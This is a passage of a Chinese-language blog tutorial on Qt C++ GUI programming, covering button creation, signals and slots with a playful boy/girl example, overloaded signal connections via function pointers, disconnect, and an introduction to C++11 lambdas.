src="/2021/09/06/qt/001.png" class=""><p>哈哈哈，很草率的一个东西。<br><code>QPushButton* btn = new QPushButton;</code>创建一个按钮对象<br><code>btn-&gt;setText(&quot;hello&quot;);</code>给按钮设置文本<br><code>btn-&gt;setParent(this);</code>设置父类，咱这在widget这个窗口下，就以他为大爹。<br><code>btn-&gt;resize(200,250);</code>resize就是设置大小很好理解<br><code>btn-&gt;move(100,200);</code>move就是在这个父类窗口中通过xy的偏移得到。<br><code>btn-&gt;show();</code>最后show，显示出来。</p><p>可能会好奇为什么要在这个widget函数里面设置和显示，包括销毁也要在widget的析构函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;QtWidgetsApplication1.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QtWidgets/QApplication&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">QApplication <span class="title">a</span><span class="params">(argc, argv)</span></span>;</span><br><span class="line">    QtWidgetsApplication1 w;</span><br><span class="line">    w.<span class="built_in">show</span>();</span><br><span class="line">    <span class="keyword">return</span> a.<span class="built_in">exec</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于qt项目的<code>main.cpp</code>，咱可以看到他是创建一个对象的，然后把w.show，这就是我们widget这个主窗口。</p><blockquote><p>widget主要是在上面放置布局和控件；所有用户界面对象的基类。<br>窗口部件是用户界面的一个基本单元：它从窗口系统接收鼠标、键盘和其它事件，并且在屏幕上&gt; 绘制自己。每一个窗口部件都是矩形的，并且它们按Z轴顺序排列。一个窗口部件可以被它的父窗口部件或者它前面的窗口部件盖住一部分</p></blockquote><blockquote><p>mainwindow可以有menu菜单、tool工具栏、status状态栏、电脑显示屏右下脚的托盘等。提供更好的可视化操作；一个正常window软件呈现给客户的可视化界面。</p></blockquote><p>当然关于qt他自己是有帮助文档的</p><img src="/2021/09/06/qt/002.png" class=""><p>额虽然大概率新手看不懂，不如直接看视频或者百度哈。</p><hr><h2 id="拖拽控件"><a href="#拖拽控件" class="headerlink" title="拖拽控件"></a>拖拽控件</h2><p>额关于其他控件，b站啥的看一下就行了，文字说明没啥灵魂的。<br>而且控件类型也不少，建议视频教学。</p><hr><h2 id="信号和槽"><a href="#信号和槽" class="headerlink" title="信号和槽"></a>信号和槽</h2><p>这个可以说是qt的精髓了，有了信号和槽，对设计者可以更直观的操作组件交互。</p><h3 id="信号-Signal"><a href="#信号-Signal" class="headerlink" title="信号(Signal)"></a>信号(Signal)</h3><p>信号会在特定的情况下发生的事件，咱最常见的PushButton，他最常见的信号就是来自鼠标的点击时发送的<code>clicked()</code>信号，一个combobox最常见的就是选择列表项时列表发生改变的<code>CurrentIndexChanged()</code>信号<br>对于GUI程序设计主要是整合各组件信号的响应，合理的去安排什么时候发送信号。</p><h3 id="槽-Slot"><a href="#槽-Slot" class="headerlink" title="槽(Slot)"></a>槽(Slot)</h3><p>信号是发送的，那么槽就是用来接收响应的。表现形式就是一个函数，与一般c++函数差不多，也可以封装到类里面。<br>槽可以有参数，也可以被直接调用，与一般的函数不同处就是槽可以与一个信号关联，信号发射时，关联的这个槽会自动触发。</p><p>信号和槽关联通过<code>QObject::connect()函数实现</code><br>基本格式示例<code>QObject::connect(sender, SIGNAL(signal()), receiver, SLOT(sloet()));</code></p><ul><li>参数1表示信号发送者</li><li>参数2表示发送的信号</li><li>参数3表示信号的接收者</li><li>参数4表示信号处理(槽)函数</li></ul><p>最简单的使用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QMetaObject::Connection ret = <span class="built_in">connect</span>(btn, &amp;QPushButton::clicked, <span class="keyword">this</span>, &amp;Widget::close);</span><br></pre></td></tr></table></figure><p>以咱前面的那个例子，此处的操作主要就是通过btn按钮，触发点击事件之后，把这个父类窗口直接关闭。</p><p><strong>注意的是，咱这里是通过自带的点击事件和窗口自带的关闭事件响应</strong></p><p>如果不知道可以百度，或者打开qt助手搜索查看一下，qt助手的路径为<code>qt安装目录下/版本号/比如mingw或者mscv，32位还是64位看你自己选择/bin/assistant.exe</code><br>可能这样描述有些人看不懂，例如我使用的msvc2019，那么路径应该是<code>D:\Qt\5.15.2\msvc2019\bin\assistant.exe</code></p><p>打开后是这样的</p><img src="/2021/09/06/qt/003.png" class=""><h3 id="如何自定义信号和槽"><a href="#如何自定义信号和槽" class="headerlink" title="如何自定义信号和槽"></a>如何自定义信号和槽</h3><p>先创建俩类</p><img src="/2021/09/06/qt/004.png" class=""><p>一个boy，一个gril，信号是love，槽就是ack_love哈哈</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//boy.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BOY_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOY_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QObject&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">boy</span> : <span class="keyword">public</span> QObject</span><br><span class="line">&#123;</span><br><span class="line">    Q_OBJECT</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">boy</span><span class="params">(QObject *parent = <span class="literal">nullptr</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">signals:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">love</span><span class="params">()</span></span>;    <span class="comment">//信号</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// BOY_H</span></span></span><br></pre></td></tr></table></figure><p><strong>qt的信号是可以不实现的，与原本的cpp有一点相违背，但是我们自己能理解就行，毕竟这个只是一个触发点，调用了这个就相当于发射了信号，内部有无实现并不重要</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gril.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> GRIL_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GRIL_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QObject&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">gril</span> : <span class="keyword">public</span> QObject</span><br><span class="line">&#123;</span><br><span class="line">    Q_OBJECT</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">gril</span><span class="params">(QObject *parent = <span class="literal">nullptr</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">signals:</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> slots:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">ack_love</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// GRIL_H</span></span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gril.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;gril.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QDebug&gt;</span></span></span><br><span class="line"></span><br><span class="line">gril::<span class="built_in">gril</span>(QObject *parent)</span><br><span class="line">    : QObject&#123;parent&#125;</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">gril::ack_love</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; <span class="string">&quot;不听不听王八念经&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>槽函数是肯定要实现的，不然鬼知道它有没有响应</strong></p><p>然后设计完了，该在哪调用。<br>首先咱用不到按钮，但是还是要承载在主窗口，主窗口是在main.cpp完成创建的，所以咱可以直接在main.cpp就开始，当然在窗口里面写其实问题也不大，关联this就行。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Widget w;</span><br><span class="line"><span class="function">boy <span class="title">x_ming</span><span class="params">(&amp;w)</span></span>;</span><br><span class="line"><span class="function">gril <span class="title">x_hong</span><span class="params">(&amp;w)</span></span>;</span><br><span class="line">w.<span class="built_in">connect</span>(&amp;x_ming, &amp;boy::love, &amp;x_hong, &amp;gril::ack_love);</span><br><span class="line">w.<span class="built_in">show</span>();</span><br><span class="line">x_ming.<span class="built_in">love</span>();</span><br></pre></td></tr></table></figure><img src="/2021/09/06/qt/005.png" class=""><p>当我们启动的时候，在下面可以看到有输出，而且代码除了connect以外，并没有调用ack_love，说明通过love信号，的确触发了ack_love槽来响应。</p><blockquote><p>关于qdebug，我们不可能直接把文字输出到窗口里吧，想搞也行，但肯定要个文本控件。最简单的就是当然调试信息直接打印在调试框里</p></blockquote><p>所以对于信号</p><ol><li>要声明在头文件的signals下</li><li>信号函数只需要声明，不需要实现</li><li>信号函数必须是void类型，都不要实现了自然也不用你返回值啥的</li><li>信号函数可以有参数，可以重载</li><li>调用信号的时候，可以在前面加一个<code>emit</code>，新版其实加不加都问题不大，还是那句话方便区分</li></ol><blockquote><p>老版本应该是指qt4了吧，现今都是qt5，未来还有qt6，虽然不知道具体差异</p></blockquote><p>对于槽</p><ol><li>槽函数不能写到signals下面，你要写在public slots下面，新版的好像可以不写slots，但是写了主要是明确直观的</li><li>槽函数除了声明还得去实现</li><li>槽函数也是void类型</li><li>也可以有参数和重载，但是大部分情况应该不会用到</li></ol><hr><h3 id="自定义信号带参数和重载"><a href="#自定义信号带参数和重载" class="headerlink" title="自定义信号带参数和重载"></a>自定义信号带参数和重载</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//boy.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BOY_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOY_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QObject&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">boy</span> : <span class="keyword">public</span> QObject</span><br><span class="line">&#123;</span><br><span class="line">    Q_OBJECT</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">boy</span><span class="params">(QObject *parent = <span class="literal">nullptr</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">signals:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">love</span><span class="params">()</span></span>;    <span class="comment">//信号</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">love</span><span class="params">(QString str)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// BOY_H</span></span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gril.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> GRIL_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GRIL_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QObject&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">gril</span> : <span class="keyword">public</span> QObject</span><br><span class="line">&#123;</span><br><span class="line">    Q_OBJECT</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">gril</span><span class="params">(QObject *parent = <span class="literal">nullptr</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">signals:</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> slots:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">ack_love</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">ack_love</span><span class="params">(QString str)</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// GRIL_H</span></span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gril.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;gril.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QDebug&gt;</span></span></span><br><span class="line"></span><br><span class="line">gril::<span class="built_in">gril</span>(QObject *parent)</span><br><span class="line">    : QObject&#123;parent&#125;</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">gril::ack_love</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; <span class="string">&quot;不听不听王八念经&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">gril::ack_love</span><span class="params">(QString str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; <span class="string">&quot;男孩:&quot;</span> &lt;&lt; str &lt;&lt; <span class="string">&quot; 女孩:hai&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意，此处编译是不通过的，因为涉及到函数重载，而connect却没有指明</strong></p><p>随机补充几个点<br>cpp补充重载</p><ol><li>函数名相同，带有不同参数（个数和类型），这样的函数构成重载</li><li>作用域要相同，比如同个类，同个源文件</li><li>重载与返回类型可同可不同，不重要</li></ol><p>cpp补充重写</p><ol><li>其实就是类中函数被定义为虚函数了，子类或者派生类继承之后重写了它</li><li>参数列表必须与父类的结构完全一致</li><li>派生类重写之后函数前缀可不加<code>virtual</code>关键字</li></ol><p>那么如何解决，有两个办法，但都涉及函数指针，因为地址是最好分别的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">QApplication <span class="title">a</span><span class="params">(argc, argv)</span></span>;</span><br><span class="line">    Widget w;</span><br><span class="line">    <span class="function">boy <span class="title">x_ming</span><span class="params">(&amp;w)</span></span>;</span><br><span class="line">    <span class="function">gril <span class="title">x_hong</span><span class="params">(&amp;w)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">void</span>(boy::*pLove)(QString) = &amp;boy::love;</span><br><span class="line">    <span class="built_in">void</span>(gril::*pAck)(QString) = &amp;gril::ack_love;</span><br><span class="line">    w.<span class="built_in">connect</span>(&amp;x_ming, pLove, &amp;x_hong, pAck);</span><br><span class="line">    w.<span class="built_in">show</span>();</span><br><span class="line">    x_ming.<span class="built_in">love</span>();</span><br><span class="line">    <span class="keyword">return</span> a.<span class="built_in">exec</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当函数指针带参数，执行我们类中的函数他会自己匹配上。</p><p>哦刚才run的时候发现没输出，一看是lov忘记填字符串了哈哈。随便填一下<code>x_ming.love(&quot;你好&quot;);</code></p><img src="/2021/09/06/qt/006.png" class=""><p>然后就可以看到有输出了。</p><p>另外一种也类似<br><code>w.connect(&amp;x_ming,(void(boy::*)(QString))&amp;boy::love, &amp;x_hong,(void(gril::*)(QString))&amp;gril::ack_love);</code></p><p>相对而言他就是强制转换了这个函数为这个带参数类型的那个，虽然效果一样，但是代码的可读性差很多。所以并不推荐这种方式。</p><hr><h3 id="信号和槽的拓展"><a href="#信号和槽的拓展" class="headerlink" title="信号和槽的拓展"></a>信号和槽的拓展</h3><p>上述的例子，我们将两个类的信号和槽直接完成关联，那么实际开发中这是一种不可控的情况，并不会被采取，所以是例子！</p><p>最合理的是什么，比如我们说过的pushbutton，他有自带的点击信号，那么就有路数了，给个提示，让btn的点击信号触发。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;boy.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;gril.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;widget.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QApplication&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QLocale&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QPushButton&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QTranslator&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">QApplication <span class="title">a</span><span class="params">(argc, argv)</span></span>;</span><br><span class="line"></span><br><span class="line">    Widget w;</span><br><span class="line">    QPushButton btn;</span><br><span class="line">    btn.<span class="built_in">setParent</span>(&amp;w);</span><br><span class="line">    btn.<span class="built_in">setText</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="function">boy <span class="title">x_ming</span><span class="params">(&amp;w)</span></span>;</span><br><span class="line">    <span class="function">gril <span class="title">x_hong</span><span class="params">(&amp;w)</span></span>;</span><br><span class="line">    <span class="built_in">void</span>(boy::*pLove)() = &amp;boy::love;</span><br><span class="line">    <span class="built_in">void</span>(gril::*pAck)() = &amp;gril::ack_love;</span><br><span class="line">    w.<span class="built_in">connect</span>(&amp;btn, &amp;QPushButton::clicked, &amp;x_ming, pLove);</span><br><span class="line">    w.<span class="built_in">connect</span>(&amp;x_ming, pLove, &amp;x_hong, pAck);</span><br><span class="line">    w.<span class="built_in">show</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a.<span class="built_in">exec</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处稍微修改了下按钮的创建时机，show在widget里面设置了。</p><img src="/2021/09/06/qt/007.png" class=""><p>效果是有的，不过同样存在一个小问题，无法带参数，因为这个clicked是个bool类型的，她不像我们可以通过函数指针去匹配带参数，这个人家自定义好的我们没法改。<br>这个特色就是连锁的connect，将信号绑定一个信号，再用这个信号触发我们的槽。</p><p>那么换个玩法，套个娃</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;widget.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ui_widget.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QPushButton&gt;</span></span></span><br><span class="line"></span><br><span class="line">QPushButton* btn = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">Widget::<span class="built_in">Widget</span>(QWidget *parent)</span><br><span class="line">    : <span class="built_in">QWidget</span>(parent)</span><br><span class="line">    , <span class="built_in">ui</span>(<span class="keyword">new</span> Ui::Widget)</span><br><span class="line">    , <span class="built_in">x_ming</span>(<span class="keyword">this</span>)</span><br><span class="line">    , <span class="built_in">x_hong</span>(<span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ui-&gt;<span class="built_in">setupUi</span>(<span class="keyword">this</span>);</span><br><span class="line">    btn = <span class="keyword">new</span> QPushButton;</span><br><span class="line">    btn-&gt;<span class="built_in">setText</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    btn-&gt;<span class="built_in">setParent</span>(<span class="keyword">this</span>);</span><br><span class="line">    btn-&gt;<span class="built_in">resize</span>(<span class="number">200</span>,<span class="number">220</span>);</span><br><span class="line">    btn-&gt;<span class="built_in">move</span>(<span class="number">100</span>,<span class="number">200</span>);</span><br><span class="line">    <span class="built_in">void</span>(boy::*pLove)() = &amp;boy::love;</span><br><span class="line">    <span class="built_in">void</span>(gril::*pAck)() = &amp;gril::ack_love;</span><br><span class="line">    <span class="built_in">connect</span>(btn, &amp;QPushButton::clicked, &amp;x_ming, pLove);</span><br><span class="line">    <span class="built_in">connect</span>(&amp;x_ming, pLove, &amp;x_hong, pAck);</span><br><span class="line">    <span class="built_in">connect</span>(btn,&amp;QPushButton::clicked, <span class="keyword">this</span>, &amp;Widget::close);</span><br><span class="line">    btn-&gt;<span class="built_in">show</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Widget::~<span class="built_in">Widget</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">delete</span> ui;</span><br><span class="line">    <span class="keyword">delete</span> btn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>让按钮先通过点击信号触发boy的love信号，再用love触发gril的ack槽，最后btn通过点击信号关闭窗口。</p><blockquote><p>x_ming和x_hong的定义放在头文件了</p></blockquote><p>最后还有一个断开连接，信号和槽能连接自然也能断开<br><code>disconnect</code>可以将信号断开连接，使用方式和连接一样</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">connect</span>(btn, &amp;QPushButton::clicked, &amp;x_ming, pLove);</span><br><span class="line"><span class="built_in">connect</span>(&amp;x_ming, pLove, &amp;x_hong, pAck);</span><br><span class="line"><span class="built_in">connect</span>(btn,&amp;QPushButton::clicked, <span class="keyword">this</span>, &amp;Widget::close);</span><br><span class="line"><span class="built_in">disconnect</span>(btn,&amp;QPushButton::clicked, &amp;x_ming, pLove);</span><br></pre></td></tr></table></figure><p>加上这一一句，最开始的btn触发plove就失效了，那么后面的通过plove触发pack自然也不存在了。</p><p>所以我们得到结论</p><ul><li>多个信号可以连接同一个槽函数</li><li>信号和槽的参数必须要一一对应</li></ul><hr><h3 id="Lambda"><a href="#Lambda" class="headerlink" title="Lambda"></a>Lambda</h3><p>有些教程叫Lambda表达式，也有的叫Lambda函数，总之它是一个匿名函数，就是没有名字的函数。<strong>跟函数指针不一样</strong><br>Lambda是c++11引入的新概念，格式：<br><code>[捕捉列表](参数)mutable-&gt;返回值类型，可以不设置&#123;函数体&#125;</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[]()&#123;</span><br><span class="line">    <span class="built_in">qDebug</span>(<span class="string">&quot;Lambda&quot;</span>);</span><br><span class="line">&#125;();</span><br></pre></td></tr></table></figure><ol><li>[]，标识一个Lambda函数的开始，不能省略<ul><li>为空时，没有使用任何的函数对象参数</li><li>&#x3D;，函数体内使用Lambda所在范围的局部变量包括类的this传值，都会通过复制一份给Lambda函数</li><li>&amp;，与&#x3D;相似，区别就是&#x3D;是复制，而&amp;是引用，意味着&#x3D;不能修改原来变量的值，而引用可以</li><li>this，函数体内可以使用Lambda所在的内部成员</li><li>a，这里表示一个变量名，指Lambda内拷贝一个变量a使用</li><li>&amp;a，表示表达式内引用变量a</li><li>a,&amp;b 表示拷贝a，引用b</li><li>&#x3D;,&amp;a,&amp;b 表示除了ab引用，其他都拷贝</li><li>&amp;,a,b 表示除了ab拷贝，其余都引用</li></ul></li><li>函数参数，与常规函数规则一致</li><li>mutable，修改关键字，在对应位置处设置关键字，才能修改函数对象参数否则报错。可有可无，必须是有才能修改。lambda默认是const，也就是不能修改本地变量<ul><li>-&gt;return-&gt;type返回值的方式，既然是函数就可能会有返回值，所以-&gt;表示有返回值的函数</li></ul></li><li>函数体就是常规函数内容</li></ol><blockquote><p>为什么要使用Lambda函数，通过上述概念，其实就知道，有些函数只是临时随便用，而且业务逻辑简单，就没有必要特意搞个函数出来，通过Lambda可以简化一些步骤。</p></blockquote><p><strong>使用Lambda，需要保证你编译器支持c++11</strong><br>qt中，你新建的项目中有个.pro的文件，里面能看到</p><p>老样子依旧写个例子</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 